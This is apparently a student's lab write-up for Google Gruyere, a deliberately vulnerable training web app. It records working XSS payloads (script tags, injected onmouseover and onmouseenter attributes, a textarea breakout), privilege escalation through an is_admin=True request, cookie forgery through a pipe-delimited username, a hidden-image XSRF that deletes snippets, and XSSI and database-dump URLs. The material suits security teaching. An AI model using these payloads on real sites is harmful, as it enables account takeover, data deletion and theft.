https://google-gruyere.appspot.com/361594034863523106218848971486142268022/

# TASK 2 - XSS (Cross Site Scripting)

URL bar:
```
<script>alert('xxs')</script>
```

Profile color: 
```
green'onmouseover='alert("color xss");'"
```

Profile homepage:
```
google.com'onmouseover="alert('a tag XSS');""
```

Snippet:
Enables it to be ran on others machines
```
<img width='50px' src='https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse2.mm.bing.net%2Fth%3Fid%3DOIP.FWOwCQvSgPnBz4yXh2yD6QHaFB%26o%3D6%26pid%3DApi&f=1' onmouseenter='alert("snippet xss")'>
```

Private snippet: Won't run on anothers machine as private

Causes alert(1) on profile editting reload
```
</textarea><iframe src="https://www.youtube.com/embed/DLzxrzFCyOs?autoplay=1" width="533" height="300" frameborder="0" allowfullscreen=""></iframe>
```

# TASK 3 - State Manipulation

## Privilege Escalation

**Hint 1**

Take a look at the editprofile.gtl page that users and administrators use to edit profile settings.
If you’re not an administrator, the page looks a bit different. Can you figure out how to fool
Gruyere into letting you use this page to update your account?

**Hint 2**

Can you figure out how to fool Gruyere into thinking you used this page to update your
account?

~~Must send a custom cookie that claims me as admin~~

I found the is_author flag in URI and the **is_admin** in the data.py file - and so tried putting the **is_admin=True** query in URI. Admitedly I didn't think anything had happened until I checked the hints Google provided and found you had to relog. 

Add is_admin=True onto a saveprofile request. So request becomes:
```
google-gruyere.appspot.com/361594034863523106218848971486142268022/saveprofile?action=update&is_admin=True
```

## Cookie Manipulation

**Hint 1**
You don’t need to look at the Gruyere cookie parsing code. You just need to know what the
cookies look like. Gruyere’s cookies use the format:
hash|username|admin|author

**Hint 2**
Gruyere issues a cookie when you log in. Can you trick it into issuing you a cookie that looks
like another user’s cookie?

Create user called "haha|admin|author"

```
google-gruyere.appspot.com/361594034863523106218848971486142268022/saveprofile?action=new&uid=Brie%7Cadmin%7Cauthor%3B%20&pw=&is_author=True
```

# TASK 4 - XSRF (Cross-Site Request Forgery)

**Hint 1**
What is the URL used to delete a snippet? Look at the URL associated with the "X" next to a
snippet.

Adding the following to a snippet will delete the second snipped from any user that views it.
```
<img src="/361594034863523106218848971486142268022/deletesnippet?index=1" style="display:none">
```

# TASK 5 - XSSI (Cross-Site Script Inclusion)

**Hint 1**
You can run a script from another domain by adding
<SCRIPT src="https://google-gruyere.appspot.com/123/..."></SCRIPT>
to your HTML file. What scripts does Gruyere have?

**Hint 2**
feed.gtl is a script. Given that, how can you get the private snippet out of the script?

GET request in URL bar to `https://google-gruyere.appspot.com/361594034863523106218848971486142268022/feed.gtl?uid=brie` returns the most recent snippet from brie

# TASK 6 - Config Vulnerabilities

**Hint 1**
Look at all the files installed with Gruyere. Are there any files that shouldn’t be there?
**Hint 2**
Look for a .gtl file that isn’t referenced anywhere.

Dump the entire DB: https://google-gruyere.appspot.com/361594034863523106218848971486142268022/dump.gtl
